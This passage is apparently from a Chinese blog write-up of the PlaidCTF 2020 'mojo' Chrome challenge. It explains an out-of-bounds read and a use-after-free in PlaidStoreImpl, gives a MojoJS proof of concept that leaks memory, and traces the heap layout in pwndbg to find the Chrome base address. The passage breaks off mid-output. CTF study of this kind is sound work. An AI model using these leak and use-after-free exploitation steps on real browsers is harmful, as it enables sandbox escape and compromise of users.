content</span></span><br></pre></td></tr></table></figure><p>而我们的漏洞代码就处于上述的实现中，下面我们来分析越界读漏洞</p><h3 id="oob"><a href="#oob" class="headerlink" title="oob"></a>oob</h3><p>oob漏洞处于如下实现的代码中,下面的代码实现了一个写入数据和读取数据的函数，而在在函数PlaidStoreImpl::GetData中，程序并没有对传入的参数count进行判断，因此该函数可以越界读取，返回比实际存储范围更大的数据。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">PlaidStoreImpl::StoreData</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> std::string &amp;key,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> std::vector&lt;<span class="type">uint8_t</span>&gt; &amp;data)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!render_frame_host_-&gt;<span class="built_in">IsRenderFrameLive</span>()) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  data_store_[key] = data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PlaidStoreImpl::GetData</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> std::string &amp;key,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">uint32_t</span> count,</span></span></span><br><span class="line"><span class="params"><span class="function">    GetDataCallback callback)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!render_frame_host_-&gt;<span class="built_in">IsRenderFrameLive</span>()) &#123;</span><br><span class="line">    std::<span class="built_in">move</span>(callback).<span class="built_in">Run</span>(&#123;&#125;);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">auto</span> it = data_store_.<span class="built_in">find</span>(key);</span><br><span class="line">  <span class="keyword">if</span> (it == data_store_.<span class="built_in">end</span>()) &#123;</span><br><span class="line">    std::<span class="built_in">move</span>(callback).<span class="built_in">Run</span>(&#123;&#125;);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function">std::vector&lt;<span class="type">uint8_t</span>&gt; <span class="title">result</span><span class="params">(it-&gt;second.begin(), it-&gt;second.begin() + count)</span></span>; <span class="comment">//oob</span></span><br><span class="line">  std::<span class="built_in">move</span>(callback).<span class="built_in">Run</span>(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="UAF漏洞"><a href="#UAF漏洞" class="headerlink" title="UAF漏洞"></a>UAF漏洞</h3><p>当PlaidStoreImpl类执行构造函数时，该类的一个实例将会保存传入的render_frame_host原始指针。（注意保留的是原始指针而不是智能指针）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PlaidStoreImpl::<span class="built_in">PlaidStoreImpl</span>(</span><br><span class="line">    RenderFrameHost *render_frame_host)</span><br><span class="line">    : <span class="built_in">render_frame_host_</span>(render_frame_host) &#123;&#125;</span><br></pre></td></tr></table></figure><p>而我们的PlaidStoreImpl::Create函数内部则会调用mojo::MakeSelfOwnedReceiver函数，该函数会将Mojo管道的一端的Receiver和PlaidStoreImpl实例相关联(注意传入的render_frame_host使用的 unique智能指针类型为PlaidStoreImpl)。这样当Mojo管道关闭或者发生错误的时候，receiver便可以将当前的PlaidStoreImpl实例释放掉，从而达到关联生命周期的目的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// static</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PlaidStoreImpl::Create</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    RenderFrameHost *render_frame_host,</span></span></span><br><span class="line"><span class="params"><span class="function">    mojo::PendingReceiver&lt;blink::mojom::PlaidStore&gt; receiver)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mojo::<span class="built_in">MakeSelfOwnedReceiver</span>(std::<span class="built_in">make_unique</span>&lt;PlaidStoreImpl&gt;(render_frame_host),</span><br><span class="line">                                std::<span class="built_in">move</span>(receiver));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是我们不能将render_frame_host所属的RenderFrameHost生命周期与PlaidStoreImpl周期相关联，这就可以导致我们在子进程释放掉render_frame_host之后，但是PlaidStoreImpl仍然存活</p><blockquote><p>一个render进程中的RenderFrame对应browser进程中的RenderFrameHost。<br>当打开新的tab或iframe时，browser将会对应的创建RenderFrameHost对象<br>释放也是如此，当某个tab或iframe被释放时，对应的RenderFrameHost对象将会被释放。</p></blockquote><p>这样我们就可以在保证Mojo Pipe不断开的前提下，将render_frame_host析构，之后就可以在PlaidStoreImpl类函数中继续使用render_frame_host，这样就可以达到UAF的目的</p><h2 id="调试和利用过程"><a href="#调试和利用过程" class="headerlink" title="调试和利用过程"></a>调试和利用过程</h2><h3 id="oob-1"><a href="#oob-1" class="headerlink" title="oob"></a>oob</h3><p>我们可以先写一段oob的poc，看看我们究竟会泄露出来什么东西</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 调用MojoJs接口时一定要把这些js包含在html中--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;mojo_js/mojo/public/js/mojo_bindings.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;mojo_js/third_party/blink/public/mojom/plaidstore/plaidstore.mojom.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">dec2hex</span>(<span class="params">dec</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + dec.<span class="title function_">toString</span>(<span class="number">16</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">bytes2WORD</span>(<span class="params">bytes</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> value = <span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span></span><br><span class="line"><span class="language-javascript">            value = value * <span class="number">0x100</span> + bytes[<span class="number">7</span> - i];</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> value;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">sucess</span>(<span class="params">message</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[+] &#x27;</span> + message);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">oob</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;oob test&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> pipe = <span class="title class_">Mojo</span>.<span class="title function_">createMessagePipe</span>();</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">//使PlaidStore和接口绑定</span></span></span><br><span class="line"><span class="language-javascript">      <span class="title class_">Mojo</span>.<span class="title function_">bindInterface</span>(</span></span><br><span class="line"><span class="language-javascript">        blink.<span class="property">mojom</span>.<span class="property">PlaidStore</span>.<span class="property">name</span>,</span></span><br><span class="line"><span class="language-javascript">        pipe.<span class="property">handle1</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="string">&quot;context&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">      );</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> plaidstorePtr = <span class="keyword">new</span> blink.<span class="property">mojom</span>.<span class="title class_">PlaidStorePtr</span>(pipe.<span class="property">handle0</span>);</span></span><br><span class="line"><span class="language-javascript">      plaidstorePtr.<span class="title function_">storeData</span>(<span class="string">&quot;aaaa&quot;</span>,<span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0x10</span>).<span class="title function_">fill</span>(<span class="number">0x31</span>));</span></span><br><span class="line"><span class="language-javascript">      plaidstorePtr.<span class="title function_">getData</span>(<span class="string">&quot;aaaa&quot;</span>,<span class="number">0x18</span>).<span class="property">then</span> (<span class="function"><span class="params">res</span>=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">dec2hex</span>(<span class="title function_">bytes2WORD</span>(res.<span class="property">data</span>.<span class="title function_">slice</span>(<span class="number">0x10</span>, <span class="number">0x18</span>))));</span></span><br><span class="line"><span class="language-javascript">      &#125;)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">oob</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>之后我们运行，运行结果如下图所示，我们可以发现其打印出来了一个很像地址的东西，下面我们来调试一下看一下这个东西到底是什么</p><img src="/2023/11/07/plaidctf2020-mojo-writeup/image1.png" class="" title="image1"><p>我们启动gdb之后，首先输入如下命令来查看函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; info function PlaidStoreImpl</span><br><span class="line">All functions matching regular expression &quot;PlaidStoreImpl&quot;:</span><br><span class="line"></span><br><span class="line">Non-debugging symbols:</span><br><span class="line">0x00005555591ac170  content::PlaidStoreImpl::~PlaidStoreImpl()</span><br><span class="line">0x00005555591ac170  content::PlaidStoreImpl::~PlaidStoreImpl()</span><br><span class="line">0x00005555591ac190  content::PlaidStoreImpl::~PlaidStoreImpl()</span><br><span class="line">0x00005555591ac1c0  content::PlaidStoreImpl::StoreData(std::__1::basic_string&lt;char, std::__1::char_traits&lt;char&gt;, std::__1::allocator&lt;char&gt; &gt; const&amp;, std::__1::vector&lt;unsigned char, std::__1::allocator&lt;unsigned char&gt; &gt; const&amp;)</span><br><span class="line">0x00005555591ac2b0  content::PlaidStoreImpl::GetData(std::__1::basic_string&lt;char, std::__1::char_traits&lt;char&gt;, std::__1::allocator&lt;char&gt; &gt; const&amp;, unsigned int, base::OnceCallback&lt;void (std::__1::vector&lt;unsigned char, std::__1::allocator&lt;unsigned char&gt; &gt; const&amp;)&gt;)</span><br><span class="line">0x00005555591ac490  content::PlaidStoreImpl::Create(content::RenderFrameHost*, mojo::PendingReceiver&lt;blink::mojom::PlaidStore&gt;)</span><br><span class="line">0x00005555591ac550  base::WeakPtr&lt;mojo::StrongBinding&lt;blink::mojom::PlaidStore&gt; &gt; mojo::MakeSelfOwnedReceiver&lt;blink::mojom::PlaidStore, content::PlaidStoreImpl&gt;(std::__1::unique_ptr&lt;content::PlaidStoreImpl, std::__1::default_delete&lt;content::PlaidStoreImpl&gt; &gt;, mojo::PendingReceiver&lt;blink::mojom::PlaidStore&gt;, scoped_refptr&lt;base::SequencedTaskRunner&gt;)</span><br></pre></td></tr></table></figure><p>之后我们将断点下在 content::PlaidStoreImpl::Create函数，然后运行r来进行调试,然后运行单步调试，我们就可以发现PlaidStore的大小为0x28，为什么是0x28我们可以看一下下面这个图片</p><img src="/2023/11/07/plaidctf2020-mojo-writeup/image2.png" class="" title="image2"><p>我们可以发现在<code>mov edi, 0x28</code>这条指令的下面是operator new函数，那么0x28就是我们传入的内存大小，因此我们可以判断其大小为0x28。之后我们继续往下运行，将operator指令运行完之后，返回的$rax就是我们的PlaidStore的地址，我们使用set命令来保存一下rax的值，然后执行fini之后查看plaid实例的布局</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/5gx 27613089091824</span><br><span class="line">0x191d2c5dd0f0: 0x000055555f50a7a0 // vt_table      0x0000191d2c544400 // render_frame_host</span><br><span class="line">0x191d2c5dd100: 0x0000191d2c5dd108 //(map start)data_store     0x0000000000000000</span><br><span class="line">0x191d2c5dd110: 0x0000000000000000 //map end </span><br></pre></td></tr></table></figure><p>然后我们执行到storeData结束，查看一下datastore布局</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/30gx 0x0000191d2c60ac80</span><br><span class="line">0x191d2c60ac80: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x191d2c60ac90: 0x0000191d2c5dd108      0x000055555824ff01</span><br><span class="line">0x191d2c60aca0: 0x0000000061616161 --&gt; key      0x0000000000000000</span><br><span class="line">0x191d2c60acb0: 0x0400000000000000      0x0000191d2c6116b0 --&gt; value1</span><br><span class="line">0x191d2c60acc0: 0x0000191d2c6116c0      0x0000191d2c6116c0</span><br><span class="line">0x191d2c60acd0: 0xffffe6e0790d9942      0xffffe6e079359582</span><br><span class="line">0x191d2c60ace0: 0x4641384341313438      0x3131413232354344</span><br><span class="line">0x191d2c60acf0: 0x3441453636414345      0x4237443438324444</span><br><span class="line">0x191d2c60ad00: 0x3439304234393133      0x4434423336343438</span><br><span class="line">0x191d2c60ad10: 0x0000191d2c616500      0x0000000000000001</span><br><span class="line">pwndbg&gt; x/20gx 0x0000191d2c6116b0</span><br><span class="line">0x191d2c6116b0: 0x3131313131313131 --&gt; 11111     0x3131313131313131</span><br><span class="line">0x191d2c6116c0: 0xffffe6e079342862      0xffffe6e079342812</span><br><span class="line">0x191d2c6116d0: 0xffffe6e079342802      0xfffffffd55553ec2</span><br><span class="line">0x191d2c6116e0: 0xffffe60000000001      0xfffffffd55553ec2</span><br><span class="line">0x191d2c6116f0: 0xffffe60000000002      0xfffffffd55553ec2</span><br><span class="line">0x191d2c611700: 0xffffe60000000001      0xfffffffd55553ec2</span><br></pre></td></tr></table></figure><p>为了接着往下查看我们需要先简单了解一下chrome中map的结构以及布局，其使用的std::map的实现如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">_Key</span>, <span class="keyword">class</span> <span class="title class_">_CP</span>, <span class="keyword">class</span> <span class="title class_">_Compare</span>,</span><br><span class="line">          <span class="type">bool</span> = is_empty&lt;_Compare&gt;::value &amp;&amp; !__libcpp_is_final&lt;_Compare&gt;::value&gt;</span><br><span class="line"><span class="keyword">class</span> __map_value_compare</span><br><span class="line">    : <span class="keyword">private</span> _Compare</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">typedef</span> __tree&lt;__value_type, __vc, __allocator_type&gt;   __base;</span><br><span class="line">    __base __tree_;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其是我们可以发现里面就一个成员_tree,其实这就是红黑树(rb tree)的实现，map其实是rb tree的一层wrapper，实际的插入删除等，都是在__tree上完成的。<br>所以我们直接看__tree的内存布局即可。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">_Tp</span>, <span class="keyword">class</span> <span class="title class_">_Compare</span>, <span class="keyword">class</span> <span class="title class_">_Allocator</span>&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">__tree</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">    __iter_pointer                                     __begin_node_;</span><br><span class="line">    __compressed_pair&lt;<span class="type">__end_node_t</span>, __node_allocator&gt;  __pair1_;</span><br><span class="line">    __compressed_pair&lt;size_type, value_compare&gt;        __pair3_;</span><br></pre></td></tr></table></figure><p>其有三个成员变量，一个是指向起始tree_node的指针，其他两个字段用不到，也就不解释了。<br>那么我们现在就知道了，对于如下impl，其偏移0x10位置处就是保持着map的起始节点，而map是一颗rb tree，所以从这个节点我们就可以索引到其他所有插入的节点了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/5gx $ps_rax</span><br><span class="line">0x191d2c5dd0f0: 0x000055555f50a7a0      0x0000191d2c544400</span><br><span class="line">0x191d2c5dd100: 0x0000191d2c60ac80      0x0000191d2c60ac80</span><br><span class="line">0x191d2c5dd110: 0x0000000000000001</span><br></pre></td></tr></table></figure><p>下面我们来看一下tree_node的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">template &lt;class _Pointer&gt; class __tree_end_node;</span><br><span class="line">template &lt;class _VoidPtr&gt; class __tree_node_base;</span><br><span class="line">template &lt;class _Tp, class _VoidPtr&gt; class __tree_node;</span><br><span class="line">...</span><br><span class="line">// node</span><br><span class="line"></span><br><span class="line">template &lt;class _Pointer&gt;</span><br><span class="line">class __tree_end_node</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">    typedef _Pointer pointer;</span><br><span class="line">    pointer __left_;</span><br><span class="line"></span><br><span class="line">    _LIBCPP_INLINE_VISIBILITY</span><br><span class="line">    __tree_end_node() _NOEXCEPT : __left_() &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">template &lt;class _VoidPtr&gt;</span><br><span class="line">class __tree_node_base</span><br><span class="line">    : public __tree_node_base_types&lt;_VoidPtr&gt;::__end_node_type</span><br><span class="line">&#123;</span><br><span class="line">    typedef __tree_node_base_types&lt;_VoidPtr&gt; _NodeBaseTypes;</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line">    typedef typename _NodeBaseTypes::__node_base_pointer pointer;</span><br><span class="line">    typedef typename _NodeBaseTypes::__parent_pointer __parent_pointer;</span><br><span class="line"></span><br><span class="line">    pointer          __right_;</span><br><span class="line">    __parent_pointer __parent_;</span><br><span class="line">    bool __is_black_;</span><br><span class="line"></span><br><span class="line">    _LIBCPP_INLINE_VISIBILITY</span><br><span class="line">    pointer __parent_unsafe() const &#123; return static_cast&lt;pointer&gt;(__parent_);&#125;</span><br><span class="line"></span><br><span class="line">    _LIBCPP_INLINE_VISIBILITY</span><br><span class="line">    void __set_parent(pointer __p) &#123;</span><br><span class="line">        __parent_ = static_cast&lt;__parent_pointer&gt;(__p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">private:</span><br><span class="line">  ~__tree_node_base() _LIBCPP_EQUAL_DELETE;</span><br><span class="line">  __tree_node_base(__tree_node_base const&amp;) _LIBCPP_EQUAL_DELETE;</span><br><span class="line">  __tree_node_base&amp; operator=(__tree_node_base const&amp;) _LIBCPP_EQUAL_DELETE;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">template &lt;class _Tp, class _VoidPtr&gt;</span><br><span class="line">class __tree_node</span><br><span class="line">    : public __tree_node_base&lt;_VoidPtr&gt;</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">    typedef _Tp __node_value_type;</span><br><span class="line"></span><br><span class="line">    __node_value_type __value_;</span><br><span class="line"></span><br><span class="line">private:</span><br><span class="line">  ~__tree_node() _LIBCPP_EQUAL_DELETE;</span><br><span class="line">  __tree_node(__tree_node const&amp;) _LIBCPP_EQUAL_DELETE;</span><br><span class="line">  __tree_node&amp; operator=(__tree_node const&amp;) _LIBCPP_EQUAL_DELETE;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们可以发现其中一共有五个成员变量，前四个大小是固定的，其整体大小依据__node_value_type的大小来决定，这个node_value_type实际上就是key-value这样一个pair对，在这里就是pair&lt;string,vector<uint8_t>&gt;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/30gx 0x0000191d2c60ac80</span><br><span class="line">0x191d2c60ac80: 0x0000000000000000 --&gt; left     0x0000000000000000 --&gt; right</span><br><span class="line">0x191d2c60ac90: 0x0000191d2c5dd108 --&gt; parent      0x000055555824ff01 --&gt;最后的01就是is_black</span><br><span class="line">0x191d2c60aca0: 0x0000000061616161 --&gt; string start     0x0000000000000000</span><br><span class="line">0x191d2c60acb0: 0x0400000000000000 --&gt; string end     0x0000191d2c6116b0 --&gt;vector</span><br><span class="line">0x191d2c60acc0: 0x0000191d2c6116c0      0x0000191d2c6116c0</span><br><span class="line">0x191d2c60acd0: 0xffffe6e0790d9942      0xffffe6e079359582</span><br></pre></td></tr></table></figure><p>接下来我们查看vector</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x0000191d2c6116b0</span><br><span class="line">0x191d2c6116b0: 0x3131313131313131      0x3131313131313131</span><br><span class="line">0x191d2c6116c0: 0xffffe6e079342862      0xffffe6e079342812</span><br><span class="line">0x191d2c6116d0: 0xffffe6e079342802      0xfffffffd55553ec2</span><br><span class="line">0x191d2c6116e0: 0xffffe60000000001      0xfffffffd55553ec2</span><br><span class="line">0x191d2c6116f0: 0xffffe60000000002      0xfffffffd55553ec2</span><br><span class="line">0x191d2c611700: 0xffffe60000000001      0xfffffffd55553ec2</span><br></pre></td></tr></table></figure><p>我们可以简单看一下vector的代码就可以知道vector是什么样子的了，首先是vector中的元素，然后就是其起始和结束地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class __vector_base</span><br><span class="line">    pointer                                         __begin_;</span><br><span class="line">    pointer                                         __end_;</span><br><span class="line">    __compressed_pair&lt;pointer, allocator_type&gt; __end_cap_;</span><br></pre></td></tr></table></figure><p>而此时我们的oob，也就是从vector的起始地址开始，可以越界读到后面的任意地址的值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap 0x191d2c5dd0f0</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">             Start                End Perm     Size Offset File</span><br><span class="line">    0x191d2c28a000     0x191d2c28b000 ---p     1000      0 [anon_191d2c28a]</span><br><span class="line">►   0x191d2c28b000     0x191d2c68a000 rw-p   3ff000      0 [anon_191d2c28b] +0x3520f0</span><br><span class="line">    0x555555554000     0x55555824b000 r--p  2cf7000      0 /media/lanan/76286875BA4E14EF/Browser-pwn/Vulnerability analyze/Plaid-CTF-2020-mojo/mojo/chrome</span><br><span class="line">pwndbg&gt; vmmap 0x0000191d2c6116b0</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">             Start                End Perm     Size Offset File</span><br><span class="line">    0x191d2c28a000     0x191d2c28b000 ---p     1000      0 [anon_191d2c28a]</span><br><span class="line">►   0x191d2c28b000     0x191d2c68a000 rw-p   3ff000      0 [anon_191d2c28b] +0x3866b0</span><br><span class="line">    0x555555554000     0x55555824b000 r--p  2cf7000      0 /media/lanan/76286875BA4E14EF/Browser-pwn/Vulnerability analyze/Plaid-CTF-2020-mojo/mojo/chrome</span><br></pre></td></tr></table></figure><p>由于impl和vector在同一段上，其应该都是通过partitionAlloc动态分配出来的，所以我们可以大量分配impl，从而使impl和vector接近线性交替存放，并最终leak出来，这里我们的判断依据是虚表地址是页对齐的，也就是最后的0x7a0是不变的，从而找到虚表地址。<br>因为虚表地址在chrome的只读数据段中(.rodata)上，所以可以通过减去偏移找到chrome的基地址。<br>这个偏移的计算相当简单，我一般直接vmmap看一下加载基地址，然后减去即可找到偏移。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap 0x000055555f50a7a0</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">             Start                End Perm     Size Offset File</span><br><span class="line">    0x55555824b000     0x55555f455000 r-xp  720a000 2cf6000 /media/lanan/76286875BA4E14EF/Browser-pwn/Vulnerability 